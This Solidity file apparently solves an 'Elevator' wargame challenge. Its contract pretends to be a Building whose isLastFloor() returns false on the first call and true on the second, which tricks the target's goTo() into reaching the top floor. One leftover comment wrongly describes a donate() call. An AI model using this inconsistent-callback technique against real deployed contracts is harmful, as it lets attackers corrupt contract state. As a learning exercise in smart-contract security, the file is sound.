// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// import "../interfaces/reentrance.sol";
import "../interfaces/elevator.sol";

/**
 * contract to simulate it is a Building and trick the elevator
 * with a function isLastFlloor() with same arguments and make it return what it wants
 */
contract elevatorAttack {

    // address payable public target;
    Elevator public immutable target;
    uint256 public target_floor;
    constructor(address payable targetAddress, uint256 _target_floor) {
        target=Elevator(targetAddress);
        target_floor=_target_floor;
    }


// attack function to call the target contract
  function attack() external {
    target.goTo(target_floor);
  }


// call the target donate() function, sending it come ETH (1/10 of the initial balance)
    function isLastFloor(uint floor) external returns (bool) {

      uint currentFloor = target.floor();

      if (floor == target_floor && currentFloor==target_floor) {
        return true;
      }

      return false;
    }
}
